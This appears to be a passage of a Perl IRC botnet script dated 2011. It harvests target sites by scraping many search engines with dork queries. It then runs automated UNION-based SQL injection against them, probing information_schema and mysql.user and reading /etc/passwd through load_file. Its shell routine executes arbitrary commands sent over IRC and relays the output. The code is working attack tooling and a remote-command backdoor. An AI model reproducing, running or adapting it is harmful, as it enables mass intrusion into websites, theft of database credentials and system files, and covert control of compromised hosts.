            if ($1 !~ /webcache|query/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sizuka() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=10; $b<=100; $b+=10) {
        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".&key($key)."&start=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a title=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /szukacz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub walla() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".&key($key)."&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<td class=sw><a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /walla\.co\.il/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub demos() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /search|dmoz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rose() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @langs = ("de","nl","fi","ps","da","en","es","fr","it","no","sv","cs","pl","ru");
foreach my $language (@langs) { $lang = $langs[rand(scalar(@langs))];
    for ($b=0; $b<=30; $b+=10) {
        my $search = ("http://euroseek.com/system/search.cgi?language=".$lang."&mode=internet&start=".$b."&string=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" class=/g) {
            if ($1 !~ /euroseek/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
	}return @list;
}

sub seznam() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.seznam.cz/?q=".&key($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {
            if ($1 !~ /seznam/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub tiscali() { 
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {
            if ($1 !~ /tiscali/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub naver() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".&key($key)."&docid=0&#9001;=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=10");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /naver/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub live {
  my $key = $_[0];
  my @list;
  my $num = 50; my $max = 5000; my $p;
  my $search = "http://search.live.com/results.aspx?q=".&key($key)."&go";
  my $msearch =  "http://search.live.com";
  my $nxsearch;
  my $res = search_engine_query($search);
  if ( $res =~ /<a  class=\"sb_pagN\" href=\"(.*?)\" onmousedown/ ) {
      my $nxsearch = $1;
  }
  while ( $res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
    my $l = $1 ; if ($l !~ /google/) { push (@list, $l); }
  }
  for ( $p=0;$p<=$max;$p += $num ) {
    $nxsearch = $msearch.htmltosearch($1)."&go";
    $res = search_engine_query("http://search.live.com/results.aspx?q=".&key($key)."&first=".$p."&FORM=PORE");
    while ( $res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
      my $l = $1 ; if ($l !~ /google/) { push (@list, $l); }
    }
  }
  return @list;
}

sub biglobe {
  my $key = $_[0];
  my @list;
  for ($b=1; $b<=500; $b+=10) {
    $num += $num;
    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search_bl_top?start=".$b."&ie=utf8&num=".$num."&q=".&key($key)."&lr=all";
    my $res = search_engine_query($search);
    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
        if ($1 !~ /biglobe/){
	    my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}   

sub nova() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://nova.rambler.ru/srch?query=".&key($key)."&page=".$b."&start=".$num);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /rambler|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub najdi() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.najdi.si/search.jsp?q=".&key($key)."&o=".$b."&maxHitsPerGroup=".$num);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onmousedown/g) {
            if ($1 !~ /najdi|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub goo() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.goo.ne.jp/web.jsp?STYPE=web&OE=UTF-8&MT=".&key($key)."&IE=UTF-8&FR=".$b."&from=pager");
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {
            if ($1 !~ /goo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub uksubmit() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://www.uksubmit.co.uk/index.php?query=".&key($key)."&searchType=Web&page=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /uksubmit/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub excite() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://msxml.excite.com/excite/ws/results/Web/".$key."/".$b."/0/0/Relevance/zoom=off/qi=".$num."/qk=20/bepersistence=true/_iceUrlFlag=7?_IceUrl=true");
        my $res = search_engine_query($search);
        while ($res =~ m/status='http:\/\/(.*?)';/g) {
            if ($1 !~ /excite|google|Yahoo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub amidalla(){
    my @list;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=100; $b+=10){
        my $web=("http://www.amidalla.de/cgi-bin/amisearch.cgi?search=".&key($key)."&page=".$b."&break=10&af=2&tld=com&et=2");		
        my $Res=search_engine_query($web);
        while ($Res =~ m/<a href=\"http:\/\/(.+?)\//g){
            if ($1 !~ /amidalla/){
                my $k=$1;
                my @grep=links($k);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub buscar() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=10){
        my $search = ("http://buscar.ozu.es/index.php?etq=web&q=".&key($key)."&pag=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            my $link = $1;
            if ($link !~ /buscar/){
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sogou() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=10){
        my $search = ("http://www.sogou.com/web?query=".&key($key)."&page=".$b."&p=40040100&dp=1&w=01019900&dr=1&_asf=www.sogou.com&_ast=1313253760");
        my $res = search_engine_query($search);
        while ($res =~ m/<a name="dttl" target="_blank" href="http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link !~ /sogou/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub interia() {
    my @list;
    my $key = $_[0];
    for ($b = 0;$b<= 100; $b+= 10) {
           my $search = ( "http://www.google.interia.pl/szukaj?q=".&key($key)."&s=szukaj&w=sw&szukaj=&p=".$b);
           my $res = search_engine_query($search);
           while ($res =~ m/text-decoration: none;\">http:\/\/(.+?)\/(.*)<\/a>/g) {
                my $link = $1;
                if ($link!~ /google|interia/) {
                   my @grep=links($link);
                   push(@list,@grep);
           }
       }
   }
  return @list;
}

sub snz() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=100) {
        my $search = ("http://searchnz.co.nz/search.aspx?q=".&key($key)."&np=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {
            my $link = $1;
            if ($link!~ /searchnz/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yandex(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://yandex.ru/yandsearch?p=".$b."&text=".&key($key)."&lr=84");
        my $res= search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /yandex/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub joeant(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://www.joeant.com/DIR/search.php?keywords=".&key($key)."&page=".$b."&limit=10");
        my $res= search_engine_query($search);
        while ($res =~ m/<a href=\http:\/\/(.*?)\//g) {
            my $link = $1;
            if ($link!~ /joeant/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub terra(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://buscador.terra.com/Results.aspx?ca=a&source=Search&query=".$key);
        my $res= search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /terra/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub youdao() { 
	my @list;
	my $key = $_[0]; {
        my $search = ("http://www.youdao.com/search?q=".&key($key)."&start=10&ue=utf8&keyfrom=".$b."&lq=".&key($key)."&timesort=0");
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /youdao/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub amfibi() { 
	my @list;
	my $key = $_[0]; {
        my $search = ("http://www.amfibi.com/search?query=".&key($key)."&start=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /amfibi|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bigclique() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.bigclique.com/search.jsp?query=".&key($key)."&hitsPerPage=10&start=".$num."&hitsPerSite=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /bigclique|cached/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub dancefloor() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.dancefloorhireuk.co.uk/events/search.php?query=".&key($key)."&start=".$b."&search=1&results=10&type=and&domain=");
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /dancefloor|query/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rakuten() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://websearch.rakuten.co.jp/Web?qt=".&key($key)."&col=OW&lg=all&st=".$b."&svx=101722");
        my $res = search_engine_query($search);
        while ($res =~ m/<a class="sc_result result" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /rakuten/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/$1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query() {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

sub sqlbrute() {
my $site=$_[0];
my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
	{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
       {
	$inyection = '';
        $union = '';
       }
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
        $response=get($sql);
    if ($response =~ /loginpwnz/)
		{
        $column ++;
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
		 &msg("$chan","$sqllogo(MySQL)4 $sql ");
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
        $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
			&msg("$chan","$sqllogo(SCHEMA)14 $sql ");
         	}
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
			&msg("$chan","$sqllogo(USER)14 $sql ");
         	}
         else
         	{
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	 $response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
			&msg("$chan","$sqllogo(Load File)14 $sql ");
		}
         else
         	{
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
		  $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
					&msg("$chan","$sqllogo(Tabel)14 $sql ");
					&tabelka($site,$tabla);
                    }
                }
	    }
	}			
}

sub tabelka() {
	my $site=$_[0];
	my $tabla=$_[1];
	my $cfin.="--";
	my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
				&msg("$chan","$sqllogo(SQLi Vuln)4 $site (Kolom)14 $columna (Tabel)14 $tabla ");
                }
            }
        
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

#################################
# powered by n0n0x [at] Auzsnet #
# copyright febuary 2011        #
# greet : x0r,thama,cr4nk,opa  #
#         joglo,Gforge,onez     #
#         cecuits,pitch and all #
#         irc.auzs.net          #
# thanks : cr4wl3r - cyberl0g   #
#################################
